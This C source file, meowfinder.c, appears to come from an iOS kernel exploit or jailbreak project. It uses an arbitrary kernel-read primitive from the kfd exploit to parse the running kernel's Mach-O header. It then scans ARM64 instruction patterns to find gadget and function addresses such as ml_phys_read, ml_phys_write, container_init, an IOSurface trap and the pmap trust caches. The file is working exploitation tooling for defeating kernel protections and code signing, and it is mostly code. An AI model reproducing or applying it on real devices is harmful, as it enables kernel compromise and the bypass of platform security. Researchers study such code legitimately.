//
//  meowfinder.c
//  meow
//
//  Created by doraaa on 2023/10/15.
//

#include "meowfinder.h"
#include "kfd_meow-Swift.h"

static unsigned char header[0x4000];

static uint64_t find_prev_insn_kread(uint64_t vaddr, uint32_t num, uint32_t insn, uint32_t mask) {
    uint32_t from = 0;
    while(num) {
        from = kread32_kfd(vaddr);
        if((from & mask) == (insn & mask)) {
            return vaddr;
        }
        vaddr -= 4;
        num--;
    }
    return 0;
}

static uint64_t search_add_x0_x0_0x40_kread(uint64_t vaddr, uint64_t size) {
    vaddr += 0x20000;
    for(uint64_t i = 0; i < (size - 0x400000); i += 4)
    {
        if(kread32_kfd(vaddr + i + 0) == 0x91010000)
        {
            if(kread32_kfd(vaddr + i + 4) == 0xd65f03c0)
            {
                return vaddr + i;
            }
        }
    }
    return 0;
}

static uint64_t search_container_init_kread(uint64_t vaddr, uint64_t size) {
    vaddr += 0x500000; // maybe
    
    //0x000140B2 [0x82408252] 0x8200A072 0x030080D2
    for(uint64_t i = 0; i < (size - 0x400000); i += 4) {
        if(kread32_kfd(vaddr + i + 0) == 0xB2400100) { //orr  x0, x8, #0x1
            if(kread32_kfd(vaddr + i + 8) == 0x72A00082) { //movk  w2, #0x4, lsl #16
                if(kread32_kfd(vaddr + i + 12) == 0xD2800003) { //mov  x3, #0x0
                    return vaddr + i - 0x30;
                }
            }
        }
    }
    return 0;
}

static uint64_t search_iosurface_trapforindex_kread(uint64_t vaddr, uint64_t size) {
    vaddr += 0x500000; // maybe
    
    // 0xF44FBEA9 0xFD7B01A9 0xFD430091 0xF30301AA
    // 0x080040F9 0x08E142F9 0xE10302AA 0x00013FD6
    
    // 0xA9BE4FF4 0xA9017BFD 0x910043FD 0xAA0103F3
    // 0xF9400008 0xF942E108 0xAA0203E1 0xD63F0100
    
    for(uint64_t i = 0; i < (size - 0x400000); i += 4) {
        if(kread32_kfd(vaddr + i + 0) == 0xA9BE4FF4) { //
            if(kread32_kfd(vaddr + i + 4) == 0xA9017BFD) { //
                if(kread32_kfd(vaddr + i + 8) == 0x910043FD) { //
                    if(kread32_kfd(vaddr + i + 12) == 0xAA0103F3) { //
                        if(kread32_kfd(vaddr + i + 16) == 0xF9400008) { //
                            if(kread32_kfd(vaddr + i + 20) == 0xF942E108) { //
                                if(kread32_kfd(vaddr + i + 24) == 0xAA0203E1) { //
                                    if(kread32_kfd(vaddr + i + 28) == 0xD63F0100) { //
                                        return vaddr + i;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}

static uint64_t search_ml_phys_read_data_kread(uint64_t vaddr, uint64_t size) {
    for(uint64_t i = 0; i < (size - 0x400000); i += 4) {
        if(kread32_kfd(vaddr + i + 0) == 0xD10183FF) {
            if(kread32_kfd(vaddr + i + 4) == 0xA9025FF8) {
                if(kread32_kfd(vaddr + i + 8) == 0xA90357F6) {
                    if(kread32_kfd(vaddr + i + 12) == 0xA9044FF4) {
                        if(kread32_kfd(vaddr + i + 16) == 0xA9057BFD) {
                            if(kread32_kfd(vaddr + i + 20) == 0x910143FD) {
                                if(kread32_kfd(vaddr + i + 24) == 0xAA0003F4) {
                                    if(kread32_kfd(vaddr + i + 28) == 0xD34EFC15) {
                                        return vaddr + i;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}

static uint64_t search_ml_phys_write_data_kread(uint64_t vaddr, uint64_t size) {
    for(uint64_t i = 0; i < (size - 0x400000); i += 4) {
        if(kread32_kfd(vaddr + i + 0) == 0xD10183FF) {
            if(kread32_kfd(vaddr + i + 4) == 0xA9025FF8) {
                if(kread32_kfd(vaddr + i + 8) == 0xA90357F6) {
                    if(kread32_kfd(vaddr + i + 12) == 0xA9044FF4) {
                        if(kread32_kfd(vaddr + i + 16) == 0xA9057BFD) {
                            if(kread32_kfd(vaddr + i + 20) == 0x910143FD) {
                                if(kread32_kfd(vaddr + i + 24) == 0xAA0003F5) {
                                    if(kread32_kfd(vaddr + i + 28) == 0xD34EFC16) {
                                        if(kread32_kfd(vaddr + i + 32) == 0x8B224008) {
                                            if(kread32_kfd(vaddr + i + 36) == 0xD1000508) {
                                                return vaddr + i;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}

//0xFFC301D1 0xFA6702A9 0xF85F03A9 0xF65704A9 0xF44F05A9
//0xD101C3FF 0xA90267FA 0xA9035FF8 0xA90457F6 0xA9054FF4

//0xFD7B06A9 0xFD830191 0xF60300AA 0x17FC4ED3 0x0840238B
//0xA9067BFD 0x910183FD 0xAA0003F6 0xD34EFC17 0x8B234008
static uint64_t search_ml_phys_write_data_kread17(uint64_t vaddr, uint64_t size) {
    for(uint64_t i = 0; i < (size - 0x400000); i += 4) {
        if(kread32_kfd(vaddr + i + 0) == 0xD101C3FF) {
            if(kread32_kfd(vaddr + i + 4) == 0xA90267FA) {
                if(kread32_kfd(vaddr + i + 8) == 0xA9035FF8) {
                    if(kread32_kfd(vaddr + i + 12) == 0xA90457F6) {
                        if(kread32_kfd(vaddr + i + 16) == 0xA9054FF4) {
                            if(kread32_kfd(vaddr + i + 20) == 0xA9067BFD) {
                                if(kread32_kfd(vaddr + i + 24) == 0x910183FD) {
                                    if(kread32_kfd(vaddr + i + 28) == 0xAA0003F6) {
                                        if(kread32_kfd(vaddr + i + 32) == 0xD34EFC17) {
                                            if(kread32_kfd(vaddr + i + 36) == 0x8B234008) {
                                                return vaddr + i;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}

void offsetfinder64_kread(void)
{
    if(!kernel_base) return;
    
    memset(&header, 0, 0x4000);
    kreadbuf_kfd(kernel_base, &header, 0x4000);
    
    const struct mach_header_64 *hdr = (struct mach_header_64 *)header;
    const uint8_t *q = NULL;
    
    uint64_t text_exec_addr = 0;
    uint64_t text_exec_size = 0;
    
    uint64_t plk_text_exec_addr = 0;
    uint64_t plk_text_exec_size = 0;
    
    uint64_t data_data_size = 0;
    uint64_t data_data_addr = 0;
    
    q = header + sizeof(struct mach_header_64);
    for (int i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (struct segment_command_64 *)q;
            if (!strcmp(seg->segname, "__TEXT_EXEC")) {
                const struct section_64 *sec = (struct section_64 *)(seg + 1);
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (!strcmp(sec[j].sectname, "__text")) {
                        text_exec_addr = sec[j].addr;
                        text_exec_size = sec[j].size;
                        printf("--------------------------------\n");
                        printf("%s.%s\n", seg->segname, sec[j].sectname);
                        printf("    addr: %016llx\n", text_exec_addr);
                        printf("    size: %016llx\n", text_exec_size);
                    }
                }
            }
            
            if (!strcmp(seg->segname, "__PLK_TEXT_EXEC")) {
                const struct section_64 *sec = (struct section_64 *)(seg + 1);
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (!strcmp(sec[j].sectname, "__text")) {
                        plk_text_exec_addr = sec[j].addr;
                        plk_text_exec_size = sec[j].size;
                        printf("--------------------------------\n");
                        printf("%s.%s\n", seg->segname, sec[j].sectname);
                        printf("    addr: %016llx\n", plk_text_exec_addr);
                        printf("    size: %016llx\n", plk_text_exec_size);
                    }
                }
            }
            
            if (!strcmp(seg->segname, "__DATA")) {
                const struct section_64 *sec = (struct section_64 *)(seg + 1);
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (!strcmp(sec[j].sectname, "__data")) {
                        data_data_addr = sec[j].addr;
                        data_data_size = sec[j].size;
                        printf("--------------------------------\n");
                        printf("%s.%s\n", seg->segname, sec[j].sectname);
                        printf("    addr: %016llx\n", data_data_addr);
                        printf("    size: %016llx\n", data_data_size);
                    }
                }
            }
        }
        q = q + cmd->cmdsize;
    }
    
    if(plk_text_exec_size)
    {
        add_x0_x0_0x40 = search_add_x0_x0_0x40_kread(plk_text_exec_addr, plk_text_exec_size);
    }
    if(!add_x0_x0_0x40)
    {
        add_x0_x0_0x40 = search_add_x0_x0_0x40_kread(text_exec_addr, text_exec_size);
    }
    if(isAvailable() >= 10) {
        container_init = search_container_init_kread(text_exec_addr, text_exec_size);
        iogettargetand = search_iosurface_trapforindex_kread(text_exec_addr, text_exec_size);
        printf("container_init : %016llx\n", container_init);
        printf("iogettargetand : %016llx\n", iogettargetand);
    }
    if(isAvailable() >= 16) {
        ml_phys_write  = search_ml_phys_write_data_kread17(text_exec_addr, text_exec_size);
    } else {
        ml_phys_write  = search_ml_phys_write_data_kread(text_exec_addr, text_exec_size);
    }
    
    empty_kdata    = data_data_addr + 0x1600;
    ml_phys_read   = search_ml_phys_read_data_kread(text_exec_addr, text_exec_size);
    
    printf("add_x0_x0_0x40 : %016llx\n", add_x0_x0_0x40);
    printf("empty_kdata    : %016llx\n", empty_kdata);
    printf("ml_phys_read   : %016llx\n", ml_phys_read);
    printf("ml_phys_write  : %016llx\n", ml_phys_write);
}

void Fugu15KPF(void) {
    objcbridge *obj = [[objcbridge alloc] init];
    mach_vm_alloc = [obj find_mach_vm_allocate];
    trust_caches  = [obj find_pmap_image4_trust_caches];
    
    printf("mach_vm_alloc  : %016llx\n", mach_vm_alloc);
    printf("trust_caches   : %016llx\n", trust_caches);
}
